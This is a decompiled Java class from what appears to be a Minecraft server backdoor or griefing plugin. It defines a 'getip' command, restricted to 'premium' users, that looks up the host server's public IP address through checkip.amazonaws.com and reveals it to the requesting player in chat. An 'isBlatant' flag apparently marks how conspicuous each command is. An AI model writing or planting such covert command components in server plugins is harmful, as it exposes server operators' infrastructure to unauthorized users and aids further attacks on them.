/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import org.bukkit.entity.Player;

public class GetipCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            try {
                URL whatismyip = new URL("http://checkip.amazonaws.com");
                BufferedReader in2 = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
                String machineIP = in2.readLine();
                p2.sendMessage(Settings.PREFIX("The server's numeric IP is: " + machineIP));
            }
            catch (IOException iOException) {}
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

